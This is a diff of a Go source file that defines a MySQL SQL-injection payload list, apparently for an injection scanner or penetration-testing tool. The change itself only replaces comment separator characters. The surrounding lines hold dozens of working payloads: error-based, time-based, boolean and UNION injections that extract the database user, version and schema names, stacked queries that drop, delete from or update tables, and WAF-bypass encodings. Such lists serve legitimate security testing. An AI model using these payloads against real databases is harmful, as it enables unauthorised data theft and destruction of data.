@@ -3,9 +3,9 @@ package payloads
 var MySQL = PayloadGroup{
 	DBMS: "MySQL",
 	Payloads: []Payload{
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ERROR-BASED (ExtractValue, UpdateXML, etc.)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "error", Content: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))--"},
 		{Type: "error", Content: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))--"},
 		{Type: "error", Content: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@VERSION),0x7e))--"},
@@ -28,9 +28,9 @@ var MySQL = PayloadGroup{
 		{Type: "error", Content: "' OR ROW(1,1) > (SELECT COUNT(*),CONCAT(0x7e,(SELECT user),0x7e,FLOOR(RAND(0)*2)) x FROM (SELECT 1 UNION SELECT 2) a GROUP BY x)--"},
 		{Type: "error", Content: "1' OR (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a)--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// TIME-BASED (SLEEP, BENCHMARK, Heavy Query)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "time", Content: "' AND SLEEP(5)--"},
 		{Type: "time", Content: "' AND SLEEP(10)--"},
 		{Type: "time", Content: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"},
@@ -62,9 +62,9 @@ var MySQL = PayloadGroup{
 		{Type: "time", Content: "')) OR SLEEP(5)--"},
 		{Type: "time", Content: "1')) OR SLEEP(5)--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// BOOLEAN-BASED (True/False comparison)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
 		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
 		{Type: "boolean", Content: "' AND (SELECT 1)=1--", Expected: "true"},
@@ -91,9 +91,9 @@ var MySQL = PayloadGroup{
 		{Type: "boolean", Content: "' OR '1'='1'/*", Expected: "true"},
 		{Type: "boolean", Content: "' OR 1=1/*", Expected: "true"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// UNION-BASED (Column count, NULL injection)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "union", Content: "' ORDER BY 1--"},
 		{Type: "union", Content: "' ORDER BY 2--"},
 		{Type: "union", Content: "' ORDER BY 3--"},
@@ -126,9 +126,9 @@ var MySQL = PayloadGroup{
 		{Type: "union", Content: "1' UNION SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),2,3--"},
 		{Type: "union", Content: "1' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),2,3--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// STACKED QUERIES
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "stacked", Content: "'; SELECT 1;--"},
 		{Type: "stacked", Content: "'; SELECT SLEEP(5);--"},
 		{Type: "stacked", Content: "'; DROP TABLE IF EXISTS test;--"},
@@ -137,9 +137,9 @@ var MySQL = PayloadGroup{
 		{Type: "stacked", Content: "'; DELETE FROM test WHERE 1=1;--"},
 		{Type: "stacked", Content: "'; UPDATE test SET id=1 WHERE 1=1;--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// DATA EXTRACTION (information_schema)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "deep", Content: "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--"},
 		{Type: "deep", Content: "' UNION SELECT GROUP_CONCAT(DISTINCT schema_name),NULL,NULL FROM information_schema.schemata--"},
 		{Type: "deep", Content: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,10--"},
@@ -157,9 +157,9 @@ var MySQL = PayloadGroup{
 		{Type: "deep", Content: "' UNION SELECT @@GLOBAL.basedir,NULL,NULL--"},
 		{Type: "deep", Content: "' UNION SELECT @@GLOBAL.plugin_dir,NULL,NULL--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ADVANCED TIME-BASED (Heavy Queries)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM (SELECT 1)a JOIN (SELECT 1)b JOIN (SELECT 1)c JOIN (SELECT 1)d JOIN (SELECT 1)e JOIN (SELECT 1)f JOIN (SELECT 1)g JOIN (SELECT 1)h)--"},
 		{Type: "time", Content: "' AND (SELECT RAND(0) * SLEEP(5) FROM INFORMATION_SCHEMA.TABLES LIMIT 1)--"},
 		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS a, INFORMATION_SCHEMA.COLUMNS b, INFORMATION_SCHEMA.COLUMNS c)--"},
@@ -181,7 +181,7 @@ var MySQL = PayloadGroup{
 		{Type: "time", Content: "1\") OR SLEEP(5)--"},
 
 		// ADVANCED BOOLEAN (Edge Cases)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "1') AND 1=1--", Expected: "true"},
 		{Type: "boolean", Content: "1') AND 1=2--", Expected: "false"},
 		{Type: "boolean", Content: "' AND 1=1 AND 1=1--", Expected: "true"},
@@ -196,7 +196,7 @@ var MySQL = PayloadGroup{
 		{Type: "boolean", Content: "1' AND '1'='2' AND 1=1--", Expected: "false"},
 
 		// ADVANCED ERROR-BASED
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(ROUND(RAND()*2),':',(SELECT user()))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a)--"},
 		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,2,3,COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT((SELECT user()),FLOOR(RAND()*2))) a)--"},
 		{Type: "error", Content: "' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT SUBSTRING( @@VERSION, 1, 32))))--"},
@@ -204,7 +204,7 @@ var MySQL = PayloadGroup{
 		{Type: "error", Content: "' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT CONCAT_WS(0x3a,USER(),DATABASE(),VERSION()))))--"},
 
 		// ADVANCED UNION
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "union", Content: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--"},
 		{Type: "union", Content: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--"},
 		{Type: "union", Content: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--"},
@@ -219,7 +219,7 @@ var MySQL = PayloadGroup{
 		{Type: "union", Content: "1\") UNION SELECT 1,2,3--"},
 
 		// WAF BYPASS (Encoding, Comments, Case)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "bypass", Content: "' /*!50000%53eLEct*/ 1,2,3--"},
 		{Type: "bypass", Content: "1' %23%0a OR 1=1 --"},
 		{Type: "bypass", Content: "admin' OR '1'='1' /*"},
